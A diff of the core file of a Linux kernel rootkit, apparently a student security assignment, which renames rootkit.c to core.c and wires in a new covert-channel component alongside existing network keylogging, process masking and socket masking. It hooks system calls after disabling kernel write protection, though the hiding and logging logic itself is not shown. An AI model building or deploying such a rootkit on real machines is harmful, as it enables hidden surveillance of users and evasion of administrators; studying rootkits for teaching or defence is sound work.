@@ -6,7 +6,7 @@
 /*   Team: 105                                                                 */
 /*   Assignment: 7                                                             */
 /*                                                                             */
-/*   Filename: rootkit.c                                                       */
+/*   Filename: core.c                                                          */
 /*                                                                             */
 /*   Authors:                                                                  */
 /*       Name: Matei Pavaluca                                                  */
@@ -30,6 +30,7 @@
 #include "network_keylogging.h"	/* Needed for ... */
 #include "process_masking.h"	/* Needed for ... */
 #include "socket_masking.h"		/* Needed for ... */
+#include "covert_channel.h"		/* Needed for ... */
 
 
 MODULE_LICENSE("GPL");
@@ -54,7 +55,7 @@ MODULE_AUTHOR("Nedko<nedko.stefanov.nedkov@gmail.com>");
 
 
 /* Definition of global variables */
-void **syscall_table;
+static void **syscall_table;
 asmlinkage long (*original_read_syscall)(unsigned int, char __user *, size_t);
 asmlinkage int (*original_getdents_syscall)(unsigned int, struct linux_dirent *, unsigned int);
 asmlinkage long (*original_readlinkat_syscall)(int , const char __user *, char __user *, int);
@@ -62,8 +63,8 @@ asmlinkage ssize_t (*original_recvmsg_syscall)(int, struct user_msghdr __user *,
 
 
 /* Declaration of functions */
-void disable_write_protect_mode(void);
-void enable_write_protect_mode(void);
+static void disable_write_protect_mode(void);
+static void enable_write_protect_mode(void);
 
 
 /*******************************************************************************/
@@ -75,7 +76,7 @@ void enable_write_protect_mode(void);
 
 /* Initialization function which is called when the module is
    insmoded into the kernel. It replaces ... */
-static int __init module_masker_start(void)
+static int __init core_start(void)
 {
 	disable_write_protect_mode();
 
@@ -96,6 +97,7 @@ static int __init module_masker_start(void)
 	network_keylogging_init(DEBUG_MODE_IS_ON);
 	process_masking_init(DEBUG_MODE_IS_ON);
 	socket_masking_init(DEBUG_MODE_IS_ON);
+	covert_channel_init(DEBUG_MODE_IS_ON);
 
 	DEBUG_PRINT("successfully inserted");
 
@@ -106,7 +108,7 @@ static int __init module_masker_start(void)
 
 /* Cleanup function which is called just before module
    is rmmoded. It restores the original read() syscall. */
-static void __exit module_masker_end(void)
+static void __exit core_end(void)
 {
 	disable_write_protect_mode();
 
@@ -118,6 +120,7 @@ static void __exit module_masker_end(void)
 
 	enable_write_protect_mode();
 
+	covert_channel_exit();
 	socket_masking_exit();
 	process_masking_exit();
 	network_keylogging_exit();
@@ -153,5 +156,5 @@ void enable_write_protect_mode(void)
 }
 
 
-module_init(module_masker_start);
-module_exit(module_masker_end);
+module_init(core_start);
+module_exit(core_end);
